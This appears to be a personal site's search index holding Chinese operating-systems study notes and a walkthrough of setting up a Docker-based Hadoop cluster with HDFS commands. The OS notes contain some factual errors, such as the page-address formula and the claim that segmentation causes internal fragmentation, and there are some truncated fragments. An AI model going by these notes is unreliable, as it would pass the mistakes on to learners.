原语操作。由于条件变量必须在管程内才能被操作，因此，对条件变量的访问也都是互斥的。\nwait(x)：\n第一，调用者进程或线程离开管程（即把锁打开）； 第二，将调用者挂在条件变量 x 的等待队列上； 第三，调用者被挂起，等待被唤醒。 signal(x)：\n把条件变量 x 的等待队列上的第一个等待者唤醒的作用。 如果该队列为空，则不产生任何效果。 条件变量和信号量的比较：\n相似点：条件变量的wait/signal操作类似于信号量的PV操作，可以实现进程的阻塞/唤醒。 不同点：条件变量是“没有值”的，仅实现了“排队等待”功能；而信号量是“有值”的，信号量的值反映了剩余资源数，而在管程中，剩余资源数用共享数据结构记录。 3.5.2 用管程解决生产者—消费者问题\u003e 3.5.2 用管程解决生产者—消费者问题 # 3.5.3 管程的不足\u003e 3.5.3 管程的不足 # 管程对编译器的依赖性。因为管程需要编译器把互斥原语加在管程的开始和结尾。 对于许多程序设计语言，并没有实现管程机制。 管程只能在单台计算机上发挥效果。由于那些直接支持管程的原语并没有提供机器之间的信息交换方法，因此管程无法在多计算机环境下或者网络环境下发挥作用。 3.6 进程的高级通信\u003e 3.6 进程的高级通信 # 高级通信机制可以归结为三大类：\n消息传递系统：在单机和网络环境都有广泛的应用 共享存储器系统：以通信的高效而著称，然而其不足也比较明显 共享文件系统：以管道通信最为典型，管道通信由 UNIX 首创，目前已被许多系统所支持，成为一种重要的通信方式。 直接通信：直接与目标进程进行通信 消息缓冲机制 间接通信：进程之间的通信要通过某种中间实体作为媒介 邮箱机制 3.6.1 消息缓冲机制\u003e 3.6.1 消息缓冲机制 # 利用内存中共用消息缓冲区来实现任意两个进程之间的信息交换\n单向通信：不等回答、不发送回答\n双向通信：发送者发送完消息后阻塞自己，直到接收者回答才会继续前进；接收者接收到信息前也阻塞等待直到收到发送者发来的消息，并且给发送者发送一个回答信息\n通信过程\n发送者在自己的内存空间设置一个发送区，填入消息 发送者申请一个消息缓冲区，将发送区的消息送到缓冲区，并挂在消息链上 接收者在自己的内存设置接收区 接收者摘下消息链第一个信息，将消息从缓冲区复制到接收区，并释放缓冲区 注意：\n消息链、缓冲区是临界资源（PV原语） 如何管理消息链？消息链有多条消息、接收者接收信息时消息链可能为空（信号量） 3.6.2 邮箱机制\u003e 3.6.2 邮箱机制 # 引入一种双方共享的数据结构——邮箱，并用邮箱的地址作为消息的间接地址。如：email\n邮箱的创建（创建者是邮箱的拥有者）\n由操作系统创建\n公用邮箱\n给系统中的核准进程使用和读取， 且在系统运行期间始终存在\n提供邮箱创建和撤销原语\n由用户进程创建\n私用邮箱\n由接收者向系统提出创建申请，归接收者拥有，而发送者只是邮箱的使用者\n共享邮箱\n拥有者和共享者都能读取邮箱中的消息\n当邮箱的拥有者进程结束时，邮箱也随之消失\n3.6.3 共享存储区\u003e 3.6.3 共享存储区 # 互斥地访问共享空间\n有基于数据结构（低级）和基于存储区（高级）的共享\n3.6.4 管道\u003e 3.6.4 管道 # 半双工，如果想实现双向同时通信，需要设置两个管道\n访问管道需要互斥\n只有管道写满才可读，读完了才能写（没写满，不允许读，反之一样）\n读出去的数据不可恢复，因此管道中的读进程最多只有一个\n3.7 死锁\u003e 3.7 死锁 # 3.7.1 什么是死锁\u003e 3.7.1 什么是死锁 # 各进程互相等待对方手里的资源，导致各进程都阻塞，无法向前推进的现象\n死锁产生的条件\n互斥 不剥夺 请求和保持 循环等待 3.7.2 死锁的表示\u003e 3.7.2 死锁的表示 # 资源分配图\n3.7.3 死锁的检测和清除\u003e 3.7.3 死锁的检测和清除 # 检测\n简化：最终能消除所有的边，一定没有发生死锁 清除\n资源剥夺\n挂起死锁进程，剥夺其资源给其他进程用，需要注意避免饥饿\n终止进程\n代价大\n进程回退\n回退到足以避免死锁的地步，要求系统记录历史信息\n3.7.4 死锁的预防\u003e 3.7.4 死锁的预防 # 破坏死锁产生的条件\n互斥——把只能互斥使用的资源改造为允许共享使用的资源（SPOOLing） 不剥夺——申请不到便主动释放或剥夺其他进程的资源 请求和保持——运行前一次性申请所有需要的资源 循环等待——必须按编号递增的顺序请求资源 3.7.5 死锁的避免\u003e 3.7.5 死锁的避免 # 银行家算法\n计算安全序列\n4. 存储管理\u003e 4. 存储管理 # 4.1 存储管理的基本功能\u003e 4.1 存储管理的基本功能 # 4.1.1 转换\u003e 4.1.1 转换 # 用户通过汇编语言或高级语言编写的程序，称为源程序。源程序是不能被计算机直接执 行的，需要通过编译、连接、加载后，装入内存才能运行。\n连接和加载\n连接\n生成装入模块（可执行文件），里面的是逻辑地址\n静态连接（程序运行前就形成完整的装入模块，之后不再拆开） 动态连接 装入时动态（边运行边连接） 运行时动态（用的时候才连接） 加载\n将逻辑地址转为物理地址\n绝对加载（只适用于单道程序环境） 可重定位加载（地址变换是在装入时一次完成的，必须一次分配全部空间） 运行时动态加载（装入时依旧是逻辑地址，需要重定位寄存器的支持，重定位寄存器放装入模块的起始位置） 地址转换\n静态地址重定位 动态地址重定位 4.1.2 存储保护和共享\u003e 4.1.2 存储保护和共享 # 内存信息保护方法 上下界寄存器\n保护键法\n界限寄存器\n重定位寄存器 物理起始地址\n界地址寄存器 逻辑地址长度\n为了充分利用内存空间，应避免每个进程拥有单独的副本，而允 许它们访问该程序的同一个副本，这一工作称为存储共享。 4.1.3 内存分配回收\u003e 4.1.3 内存分配回收 # 连续分配方式\n一般无内存保护\n只适用于单用户、单任务的操作系统\n有内部碎片，存储器利用率很低\n离散分配方式\n分页存储管理方式，分段存储管理方式和段页式存储管理方式\n当进程大小超出内存的可用空间时，这个进程是无法运行的\n虚拟存储管理方式\n请求分页式管理方式、请求分段式管理方式和请求段页式管理方式\n通过实现部分装入和部分对换功能，形成了虚拟存储管理方式\n4.1.4 内存扩充\u003e 4.1.4 内存扩充 # 由应用程序控制的：覆盖方式\n分为固定区和覆盖区\n对用户不透明，不能实现虚拟存储器\n操作系统控制的：交换方式、请求调入方式和预调入 方式\n交换技术：进程暂时换出外存，PCB留在内存\n和覆盖的区别：覆盖在同一个进程之间，交换在不同进程之间\n4.2 分区存储管理\u003e 4.2 分区存储管理 # 4.2.1 固定分区\u003e 4.2.1 固定分区 # 大小相等 可变大小 4.2.2 动态分区\u003e 4.2.2 动态分区 # 克服固定分区中小进程占据大分区的现象，避免分区内部 出现碎片；\n进程进入内存前并不建立分区，而是根据进程大小对内存进行划分，因此，内存中分区个数是可变的。\n由于各个进程执行时，都会装入与之相符的分区中，并连 续存储，因而进程大小受限于内存空间的容量，无法实现虚拟存储。\n紧凑技术：（两种策略）\n释放后立即进行紧凑 找不到足够大的分区再进行紧凑 4.2.3 地址转换和存储保护\u003e 4.2.3 地址转换和存储保护 # 4.2.4 存储共享\u003e 4.2.4 存储共享 # 4.2.5 分配和回收算法\u003e 4.2.5 分配和回收算法 # 固定分区的分配算法\n动态分区的分配算法\n首次适应\n每次都从低地址开始查找，找到第一个能满足大小的空闲分区\n最佳适应\n空闲分区按容量递增次序连接，因此第一个找到的满足要求的空闲分区，一定是刚刚好合适的\n优先使用更小的空闲区，会产生很多外部碎片\n最坏适应\n空闲分区按容量递减次序连接\n优先使用最大的空闲区，导致大进程到达很可能没空闲分区可用了\n邻近适应\n每次查找都从上一次结束的位置开始查找，减少查找开销\n动态分区的回收算法\n移动技术\n紧凑\n4.2.6 覆盖和交换\u003e 4.2.6 覆盖和交换 # 覆盖 交换 4.2.7 分区存储管理的优缺点\u003e 4.2.7 分区存储管理的优缺点 # 优点 支持多道程序设计，实现了多个进程对内存的共享。提高了内存和 CPU 的利用效率； 简单 缺点 要求进程在分区内连续存储，因而进程大小受内存空间容量的限制； 难以实现存储共享 固定分区分配算法会产生内部碎片，动态分区分配算法会产生外部碎片，因而， 内存利用率不高。 4.3 分页式存储管理\u003e 4.3 分页式存储管理 # 分区存储管理要求每个进程在分区内是连续存储的，致使不论是固定分区管理，还是 动态分区管理，在内存空间利用率上都是低效的，因为前者产生内部碎片，后者产生外部碎 片。在动态分区管理中，虽然紧凑是解决内存外部碎片的一种途径，但需要移动大量信息， 花去不少处理机时间，代价比较高。究其原因在于分区存储管理要求把进程必须放置在一块连续的存储区中，而分页式存储管理正是要避开这种连续性的要求。\n4.3.1 基本原理\u003e 4.3.1 基本原理 # 分页式存储管理允许把一个进程分配到不相邻的分区中。 将进程的逻辑空间和内存空间划分为同样大小的块，分别称为页和页面（page frame） 4.3.2 数据结构\u003e 4.3.2 数据结构 # 页表是操作系统为每个用户进程建立的，在内存中占有 一块固定的区域，用来记录程序页和内存页面的一一对应关系 作业表是操作系统为当前运行的所有作业建立的，用来记录每个作业的页表起址和页表 长度，以进行内存分配和地址变化。作业表是整个系统一张。 4.3.3 地址转换和存储保护\u003e 4.3.3 地址转换和存储保护 # 物理地址 = 页面号 × 页表长度 + 页内地址 4.3.4 存储共享\u003e 4.3.4 存储共享 # 数据共享和程序共享 4.3.5 分配算法\u003e 4.3.5 分配算法 # 4.3.6 分页式存储管理的优缺点\u003e 4.3.6 分页式存储管理的优缺点 # 优点：实现了离散存储\n缺点：\n消除了外部碎片，但内部碎片仍然存在 在进行地址转换和存储保护时，需要有相应的硬件支持，增加了机器成本。 4.4 分段式存储管理\u003e 4.4 分段式存储管理 # 在分区存储管理和分页式存储管理中，进程的逻辑地址空间是按线性排列的。虽然，分 区存储管理或分页式存储管理可以把程序划分成区或页，但这些区或页与源程序的公用子程 序和数据毫无逻辑关系，而公用子程序和数据的共享则要求信息在逻辑上是完全的，因而， 这两种方式难以将用户给定的程序名和数据块名与这些被共享进程的程序和数据的区或页对应起来。\n4.4.1 基本原理\u003e 4.4.1 基本原理 # 根据逻辑划分段，每个段都有自己的名字 与分页式存储管理相比，分段式存储管理有两个 显著的特征： 在分页式存储管理中，内存中的页面号递增排列，地址空间属于一维结 构，而在分段式存储管理中，段号在内存中的分区之间无任何顺序关系，地址空间属于二维结构； 在分页式存储管理中，每个页的长度固定，而在分段式存储管理中，为了确保信息在逻辑上是完整的，段的长度可变。分段式存储管理为进程的每一段分配一个连续的内存空间，而各个段之间并不要求一定连续。 4.4.2 地址转换和存储保护\u003e 4.4.2 地址转换和存储保护 # 4.4.3 存储共享\u003e 4.4.3 存储共享 # 段的共享是指在多道程序设计环境下，用户进程需要共享内存中的某段程序或数据时，只要使用相同的段名，在其段表中填入已存在于内存之中的段基址，便可实现逻辑上完整的信息共享\n4.4.4 分段式存储管理的优缺点\u003e 4.4.4 分段式存储管理的优缺点 # 优点\n信息共享\n在实现指令和数据的共享时，常常需要以信息的逻辑单位基础，而分页式存储管理中的每一页只是存放信息的物理单位，其本身没有完整的意义，因而不便于实 现信息的共享，而段却是信息的逻辑单位，有利于实现信息的共享；\n动态增长\n在实际的系统中，往往有些数据段会不断地增长，而事先却无法知道 数据段会增长到多大，分段式存储管理可以较好地解决这个问题。\n动态连接\n动态连接是指在进程运行之前，并不把几个目标程序段都连接起来， 而是先将主程序对应的目标程序装入内存并启动运行，当运行过程中又需要调用某段时，再将该段（目标程序）调入内存并连接起来。所以，**\n提供了内存和外存统一管理的虚存实现方式。\n缺点\n需要有更多的硬件支持，提高了机器成本； 消除外部碎片，存在内部碎片（同一个进程的最后一点点空间） 缺段中断处理以及允许段的动态增长会给系统增加难度和开销。 4.5 段页式存储管理\u003e 4.5 段页式存储管理 # 式既具有分页式存储管理有效 避免产生外部碎片的优点，又具有分段式存储管理能很好实现共享存储的长处\n4.5.1 基本原理\u003e 4.5.1 基本原理 # 先将整个内存划分成大小相等的、位置固定的页面 再把进程按逻辑关系分为若干个段，并为每个段赋予一个段名 最后把每段的线性地址空间划分成与页面大小相等的页 作业表整个系统一张，用于记录系 统中所有作业的段表的起始地址；\n段表每个作业一张，用于记录该作业的所有段以及每段的页表的起始地址；\n页表每个段一张，用户记录该页是否在内存、所对应的内存页面号。\n4.5.2 地址转换\u003e 4.5.2 地址转换 # 4.5.3 段页式存储管理的优缺点\u003e 4.5.3 段页式存储管理的优缺点 # 段页式存储管理具有分页式存储管理和分段式存储管理的优点。但是，反过来说，所需的硬件支持、复杂性和系统开销也会随之增加。在地址转换过程中，如果不采用快 表提高地址转换速度，那么 CPU 的执行速度将大大下降。\n4.6 虚拟存储管理\u003e 4.6 虚拟存储管理 # 当一个进程在执行过程中，若需要访问的指令和数据在内存中，则继续执行；若不在内存中，则系统将把这部分信息自动调入内存，称为部分装入；若内存中没有足够多的空闲区，则系统需把内存中暂时不用的信息从内存中调出，称为部分对换。\n4.6.1 虚拟存储器的概念\u003e 4.6.1 虚拟存储器的概念 # 虚拟存储器是指：具有自动实现部分装入和部分对换功能，能只把进程的 一部分装入内存便可运行，从逻辑上，是对内存容量进行扩充的一种虚拟的存储器系统。\n虚拟存储器的逻辑容量由内存和外存容量之和所决定\n时两进程P1，P2通过两FIFO缓冲区队列连接（如图），每个缓冲区长度等于传送消息长度，进程P1，P2之间的通信满足如下条件：问。（连续存储）\n抖动现象：增加内存分配也不能显著减少内存和外存之间的交换次数。或者是，页面在内存与外存之间频繁调度，以至于调度页面所需时间比进程实际运行时间还多，此时系统效率急剧下降，导致系统崩溃。\n4.6.2 请求分页式虚拟存储管理\u003e 4.6.2 请求分页式虚拟存储管理 # 4.6.3 请求分段式虚拟存储管理\u003e 4.6.3 请求分段式虚拟存储管理 # 4.6.4 请求段页式虚拟存储管理\u003e 4.6.4 请求段页式虚拟存储管理 # 4.7 页面置换算法\u003e 4.7 页面置换算法 # 4.7.1 最佳置换算法（OPT）\u003e 4.7.1 最佳置换算法（OPT） # 每次选择以后永不使用，或者最长时间内不再被访问的页面 可以保证最低的缺页率，但是实际使用时是无法实现的，因为操作系统无法提前预判各个页面的访问序列 4.7.2 先进先出置换算法（FIFO）\u003e 4.7.2 先进先出置换算法（FIFO） # 淘汰最早进入内存的页面 会产生belady异常 4.7.3 最近最久未使用置换算法（LRU）\u003e 4.7.3 最近最久未使用置换算法（LRU） # 淘汰最近最久未使用的页面 4.7.4 最少使用（LFU）\u003e 4.7.4 最少使用（LFU） # 看前面使用次数 4.8 页面分配策略\u003e 4.8 页面分配策略 # 4.8.1 驻留集\u003e 4.8.1 驻留集 # 驻留集：请求分页存储管理中心给进程分配的物理块的集合\n太小：缺页频繁（极端情况：每次调页都会缺页中断） 太大：并发度下降（极端情况：全部页面都在内存中） 分配策略\n固定分配：驻留集大小不变 可变分配：驻留集大小根据进程实际运行情况改变 局部置换：发生缺页时只能选进程自己的物理块进行置换 全局置换：发生缺页时可以将操作系统保留的空闲物理块或者其他进程的物理块分配给缺页进程 可变分配全局置换：只要某进程发生缺页后，都将获得新的物理块，如果这个新的物理块来自其他的进程，则会导致这个被选中的进程的缺页率增加。 可变分配局部置换：操作系统根据该进程的缺页率，适当增减驻留集 4.8.2 调入策略\u003e 4.8.2 调入策略 # 调入页面的时机\n预调页策略\n主要用于进程的首次调入，由程序员指出应该先调入哪些部分\n请求调页策略\n进程运行期间使用，每次只掉一页，IO开销大\n从外存中的何处调入页面\n对换区（连续分配，速度快，容量小） 进程运行前需要从文件区复制需要的数据到对换区 文件区（离散分配，速度慢，容量大） 不会被修改的数据 4.8.3 抖动、颠簸\u003e 4.8.3 抖动、颠簸 # 现象：刚换出的页面马上又要换入内存，刚刚换入的页面马上又要换出外存\n原因：分配给进程的物理块不够\n4.8.4 工作集\u003e 4.8.4 工作集 # 指在某段时间间隔内，进程实际访问页面的集合 根据工作集的大小确定驻留集的大小 5. 文件系统\u003e 5. 文件系统 # 它由文件和目录两个部分组成，文件用于存储用户和系统的程序和数据； 目录用于组织系统内的文件，并提供有关文件的信息。对用户而言，文件系统最重要的功能之一就是 通过“按名存取”的方式来实现对文件信息的存储和检索，使得用户能透明地存储和访问文 件，只关心文件操作和逻辑结构，不涉及文件的存储结构。\n5.1 文件和文件系统\u003e 5.1 文件和文件系统 # 5.1.1 文件概念\u003e 5.1.1 文件概念 # 逻辑结构：按名存取 物理结构：把用户对文件操作请求转换为对存储介质上信息所在的位置的各种操作 文件是在逻辑上具有完整意义的信息集合 文件是逻辑外存的最小分配单元。数据除非写入文件中，否则不能存储到外存 文件可存储多种不同类型的信息 数据项：描述对象的属性 记录：是一组相关域的集合，是在逻辑上具有独立含义的最小信息单位。 文件：一组相关记录的集合 数据库：相关数据的集合 5.1.2 文件命名\u003e 5.1.2 文件命名 # 文件名.扩展名 通配符：？\u0026gt; 字符串 * \u0026gt; 字符 5.1.3 文件类型\u003e 5.1.3 文件类型 # 在Windows系统中，扩展名表示文件类型 在Linux中，文件的内容决定文件类型 5.1.4 文件属性\u003e 5.1.4 文件属性 # 所有文件的属性信息都保存在目录结构中，但由于目录和文件一样，是易失性的。因此，目录结构必须保存在外存上。 5.1.5 文件系统的概念\u003e 5.1.5 文件系统的概念 # 早期的计算机系统没有文件系统，大容量直接存取的磁盘存储器的问世，导致了文件系统的出现，它是一组系统软件。 功能 以统一的方式对磁盘等外存进行统一管理； 目录管理，实现文件的按名存取； 实现文件从逻辑结构到物理结构的转换； 实现文件信息的共享，并提供文件的保护和加密措施； 向用户提供接口，方便使用文件操作。 5.2 文件组织、存取方法和存取设备\u003e 5.2 文件组织、存取方法和存取设备 # 5.2.1 文件的逻辑结构\u003e 5.2.1 文件的逻辑结构 # 字符流式的无结构文件\n如：.txt 通常按长度来读取所需信息，可以使用特殊字符作为分界 记录式的有结构文件\n使用者的每次操作总是以一个逻辑记录为对象 常见的记录式的有结构文件有：堆、顺序文件、索引顺序文件、索引文件和直接文件。 5.2.2 文件的物理结构\u003e 5.2.2 文件的物理结构 # 构造文件的物理地址\n计算法：根据键和映射函数，计算出物理地址 指针法：设置专门的指针，指明相应记录的物理地址或各记录之间的关联。 文件物理结构和组织方法：顺序文件、连接文件、索引文件和直接文件\n顺序文件\n逻辑上连续的信息物理上也连续 优点 存取速度快 当文件是定长记录文件时，还可以随机访问 缺点 事先确定文件长度，不利于文件动态增长 要求分配连续的存储空间 分配的物理块中会产生碎片 对文件进行增删比较困难 综上，不适合存放用户文件、数据库文件等经常被修改的文件。 连接文件（串联文件）\n文件放在用指针连接的离散的物理块中 优点 文件长度可动态增长 增删容易 缺点 搜索效率低 不适合随机存取 索引文件\n优点： 动态增长 增删容易 随机存取 缺点 增加存储开销 访问外存次数多 直接文件（连接文件）\n直接文件使用散列法或杂凑法（Hash 法），在直接存取存储设备上，把记录的关键字与其地址之间建立某种对应关系，以便实现快速存取。使用 hash 技术需要建立一张 hash 表，一个 hash 表是一个指针数组，数组通过索引访问，数组元素中的指针指向数据记录。\n5.2.3 文件的存取方法\u003e 5.2.3 文件的存取方法 # 常用的存取方法有三种：顺序存取、随机存取和索引存取。\n顺序存取 随机存取 索引存取 5.2.4 文件的存储设备\u003e 5.2.4 文件的存储设备 # 存储设备的特性决定了文件的组织和存取方法\n存储设备\n顺序存取设备（磁带）\n直接存取设备（磁盘）\n卷和块\n5.3 文件目录\u003e 5.3 文件目录 # 文件名 文件名到文件物理块的转换 文件名和结构信息的组织结构 文件说明 文件控制块 文件目录和目录文件 5.3.0 文件控制块（FCB）\u003e 5.3.0 文件控制块（FCB） # 文件控制块是按名存取的前提 5.3.1 一级目录结构\u003e 5.3.1 一级目录结构 # 5.3.2 二级目录结构\u003e 5.3.2 二级目录结构 # 5.3.3 树形目录结构\u003e 5.3.3 树形目录结构 # 缺点：\n不便于实现文件共享 5.3.4 无环图目录结构\u003e 5.3.4 无环图目录结构 # 5.3.5 索引结点（FCB的改进）\u003e 5.3.5 索引结点（FCB的改进） # 5.4 文件共享与保护\u003e 5.4 文件共享与保护 # 5.4.1 文件共享\u003e 5.4.1 文件共享 # 文件共享的实现方式有：系统目录实现方式、连接实现方式和符号连接方式。\n系统目录实现方式\n用户通过全路径名共享地访问共享文件\n缺点\n无法实现共享文件的动态增长。假设用户 A 和用户 B 通 过系统目录方式实现了对文件 F 的共享。当用户 A 对文件 F 进行修改，使其长度由原来的 20K 增加到 60K 时，对用户 B 而言，自己的目录项中关于文件 F 的长度信息并没有改变， 因而无法实现共享文件的动态增长。也就是说用户 A 对文件 F 增加了新的内容，用户 B 却看不到增加的内容。\n连接实现方式（是基于索引节点的共享方式）\n缺点：某个用户删除共享文件时，容易造成其他共享用户的指针悬空。\n※根据王道考研课的讲述：只有在count==0时才会允许删除文件，一般情况下，其中一个用户把文件删除，删的只是指向该索引结点的指针，即删除指向文件的指针。\n符号连接方式\n类似于Windows的快捷方式 5.4.2 文件保护\u003e 5.4.2 文件保护 # 一般可以使用以下四种文件保护方式：存取控制矩阵、存取控制表、 密码方式和加密方式。\n存取控制矩阵\n在理论上是可行的，但实现上确有困难。当一个系统用户 数和文件数很大时，访问控制矩阵将会变得非常庞大，既占用了大量的内存空间，还会加重 使用文件时对访问控制矩阵扫描所带来的时间开销。 存取控制表\n分组管理\n口令方式\n两种方式：\n是当用户进入系统，为建立终端进程时获得系统使用权的口令。如果用户输入的口令与原来设置的口令不一致的话，该用户将被系统拒绝。 每个用户在创建文件时，为每一个创建的文件设置一个口令，且将其置于文件说明中。 当任一用户想使用该文件时，都必须提供口令。只有当口令匹配时才能对文件进行存取。 优点：简单，占用的内存空间以及验证口令所需的时间少。\n缺点\n用户需要记住的口令数量过大，以致这种方案不可行； 如果所有文件只使用一个口令，那么它一旦被发现，所有文件都将被访问。 加密方式\n在用户创建源文件并将其写入存储设备时 对文件进行编码加密，在读出文件时对其进行译码解密。 与口令方式相比，加密方式中使用的密钥没有存放在系统中，由用户自己保管，具有 保密性强的优点。 5.5 文件系统其他功能的实现\u003e 5.5 文件系统其他功能的实现 # 5.5.1 文件操作\u003e 5.5.1 文件操作 # 操作命令 DOS 系统中的 dir，cd，copy，del，attrib，men 系统调用 增删查改 5.5.2 文件系统的层次结构\u003e 5.5.2 文件系统的层次结构 # 5.5.3 外存空间管理\u003e 5.5.3 外存空间管理 # 外存空间中空闲块的管理可以采用以下方式：（1）空闲块表；（2）空闲块链表；（3） 成组空闲块链；（4）位示图。\n空闲块表\n此表包含两个登记项：该空闲区的第 一个盘块号和盘块总数。 空闲块表的分配算法有最先适应算法、最佳适应算法和最坏适应算法。 空闲块链表\n删除文件时，释放该文件所占用的空闲块，并把这些块挂到空闲块链表上。这种方法效率很低，因为每次申请一块块都要读出空闲块并取得指针，申请多块时要多次读盘 便于文件动态增长和收缩 成组空闲块链\n位示图\n优点是可以把位示图全部或大部分保存在主存中，再配合计算机具有的位操作指令，可实现高速物理块分配和回收。\n5.5.4 虚拟文件系统\u003e 5.5.4 虚拟文件系统 # 虚拟文件系统要实现以下目标：应同时支持多种文件系统；系统中可以安装多个文件系 统，它们应与传统的单一文件系统没有区别，用户的使用接口不变；对网络共享文件提供完 全支持，即访问远程结点上的文件系统应与访问本地结点的文件系统一致；支持开发出新的 文件系统，以模块方式加入到操作系统中 虚拟文件系统并不是一种实际存在的文件系统，它只存在于内存中，不存在 于外存空间，在操作系统启动时建立，在系统关闭时消亡。 6. 设备管理\u003e 6. 设备管理 # 数据传输方式\n程序直接控制方式 中断控制方式 DMA 通道 ","date":"2022-01-07","permalink":"/docs/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/","section":"Docs","summary":"1. 绪论\u003e 1. 绪论 # 1.1 操作系统概述\u003e 1.1 操作系统概述 # 1.1.1 操作系统的定义\u003e 1.1.1 操作系统的定义 # Operating System 是指控制和管理整个计算机系统的硬件与软件资源，合理地组织和调度计算机的工作和资源的分配，进而为用户和其他软件提供方便接口与环境的程序集合。\n操作系统是计算机系统中最基本的系统软件。\n1.1.2 操作系统的功能\u003e 1.1.2 操作系统的功能 # 操作系统是用户和计算机硬件之间的接口。\n命令接口\n联机命令接口（交互式命令接口）\n适用于分时和实时操作系统\n脱机命令接口（批处理命令接口）\n适用于批处理系统","title":"操作系统学习笔记"},{"content":"","date":"2022-01-07","permalink":"/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/","section":"Tags","summary":"","title":"大数据"},{"content":"集群配置\u003e 集群配置 # kali+docker\n选择一个目录存放git clone的目录，克隆项目\n项目克隆前需要换源以及git ssh配置\ncd ~/clonprj\ngit clone git@github.com:big-data-europe/docker-hadoop.git\ncat docker-compose.yml 查看资源清单\nversion: \u0026#34;3\u0026#34; services: namenode: image: bde2020/hadoop-namenode:2.0.0-hadoop3.2.1-java8 container_name: namenode restart: always ports: - 9870:9870 - 9000:9000 volumes: - hadoop_namenode:/hadoop/dfs/name environment: - CLUSTER_NAME=test env_file: - ./hadoop.env datanode: image: bde2020/hadoop-datanode:2.0.0-hadoop3.2.1-java8 container_name: datanode restart: always volumes: - hadoop_datanode:/hadoop/dfs/data environment: SERVICE_PRECONDITION: \u0026#34;namenode:9870\u0026#34; env_file: - ./hadoop.env resourcemanager: image: bde2020/hadoop-resourcemanager:2.0.0-hadoop3.2.1-java8 container_name: resourcemanager restart: always environment: SERVICE_PRECONDITION: \u0026#34;namenode:9000 namenode:9870 datanode:9864\u0026#34; env_file: - ./hadoop.env nodemanager1: image: bde2020/hadoop-nodemanager:2.0.0-hadoop3.2.1-java8 container_name: nodemanager restart: always environment: SERVICE_PRECONDITION: \u0026#34;namenode:9000 namenode:9870 datanode:9864 resourcemanager:8088\u0026#34; env_file: - ./hadoop.env historyserver: image: bde2020/hadoop-historyserver:2.0.0-hadoop3.2.1-java8 container_name: historyserver restart: always environment: SERVICE_PRECONDITION: \u0026#34;namenode:9000 namenode:9870 datanode:9864 resourcemanager:8088\u0026#34; volumes: - hadoop_historyserver:/hadoop/yarn/timeline env_file: - ./hadoop.env volumes: hadoop_namenode: hadoop_datanode: hadoop_historyserver: docker-compose build 项目构建\ndocker-compose up -d 自动安装依赖\ndocker network list 查看集群的PID\ndocker network inspect ID 查看各个容器是什么IP\n使用网页访问hadoop\n每次重启电脑都有可能变化，即使虚拟机挂起，也会遇到问题\nNamenode: http://\u0026lt;dockerhadoop_IP_address\u0026gt;:9870/dfshealth.html#tab-overview History server: http://\u0026lt;dockerhadoop_IP_address\u0026gt;:8188/applicationhistory Datanode: http://\u0026lt;dockerhadoop_IP_address\u0026gt;:9864/ Nodemanager: http://\u0026lt;dockerhadoop_IP_address\u0026gt;:8042/node Resource manager: http://\u0026lt;dockerhadoop_IP_address\u0026gt;:8088/ 由于kali虚拟机和宿主机不通，所以需要在kali里面访问web页面\n选择一个结点，进入执行命令\ndocker exec -it c8s /bin/bash\n查看hdfs的位置\nwhich hdfs\n查看命令\n/opt/hadoop-3.2.0/bin//hdfs dfs\n执行命令\n/opt/hadoop-3.2.0/bin//hdfs dfs -mkdir -p /datas/test/input\nor\nhadoop fs -mkdir /sanguo\nhdfs命令学习\u003e hdfs命令学习 # # 需要先把宿主机的文件移到容器中，然后将容器的文件上传到hadoop中 # 也可以直接在容器中新建文件，只是docker的容器都是精简版，没有vi也没有vim # 在指定的文件夹存放需要复制的文件 # 新建目录input和文件sanguo.txt cd /opt/module/hadoop-3.2.0/ mkdir input cd input vim sanguo.txt # 查看目标容器ID docker ps -a # 从宿主机复制文件到容器 docker cp /opt/module/hadoop-3.2.0/input/ 51ca5b603c74:/input/sanguo/ # 然后将容器的文件上传到hadoop中 # 以下命令在容器操作 # 选择容器的文件上传到集群 # 剪切 hadoop fs -moveFromLocal ./input/shuguo.txt /sanguo # 复制上传 hadoop fs -put ./input/sanguo / #这会把sanguo包括其内部的文件全部递归上传 /sanguo/shuguo.txt hadoop fs -put /input/sanguo /sanguo #这会导致两层目录重名 即/sanguo/sanguo/shuguo.txt # 删除目录和文件 hadoop fs -rm -r /sanguo hadoop fs -rm /sanguo/shuguo.txt # 追加文件到已经存在的文件末尾 hadoop fs -appendToFile /input/sanguo/liubei.txt /sanguo/shuguo.txt # 提升文件权限 hadoop fs -chmod 666 /sanguo/shuguo.txt # 修改文件所有者owner、所有群group hadoop fs -chown kali:kali /sanguo/shu guo.txt # 修改副本数量 hadoop fs -setrep 10 /jingguo/shuguo.txt # Replication 10 set: /jingguo/shuguo.txt #这里设置的副本数只是记录在NameNode的元数据中，是否真的会有这么多副本，还得看DataNode的数量。因为目前只有3台设备，最多也就3个副本，只有节点数的增加到10台时，副本数才能达到10。 比较大的文件上传会分为多个block\n执行命令时遇到的问题\u003e 执行命令时遇到的问题 # put时遇到的error\nput: File /sanguo/shuguo.txt._COPYING_ could only be written to 0 of the 1 minReplication nodes. There are 0 datanode(s) running and 0 node(s) are excluded in this operation. 前一天晚上为了方便，直接挂起虚拟机，以为重新打开各个结点分配的IP不会变，直接打开web就可以，不需要一个个网址重新输入，事实证明还是想的太简单了，不仅网址无法连接，连使用命令上传文件也发生了问题，网上搜是需要format啥的，比较麻烦，风险又大，我可不想好不容易搭建起来的环境崩溃。\n于是我想着既然昨天没问题而虚拟机也没有关机，问题一定出在挂起。虽然挂起可以保存虚拟机离开时的状态，但是宿主机为其分配的存储空间不同，宿主机关机了之后会重新给虚拟机分配存储空间，进而影响到docker容器，因此需要重启分配存储空间。\n原因：HDFS重新做了格式化，导致版本不一致\n解决：重启虚拟机\nput时遇到的一个INFO，经过搜索，这是正常的，不用理会\n追加文件时出现错误 appendToFile: Failed to replace a bad datanode on the existing pipeline due to no more good datanodes being available to try. 解决办法：hadoop 解压路径下 / etc/ hadoop / hdfs-stie.xml\n添加以下配置内容\n\u0026lt;!-- appendToFile追加 --\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;dfs.support.append\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;true\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;dfs.client.block.write.replace-datanode-on-failure.policy\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;NEVER\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;property\u0026gt; 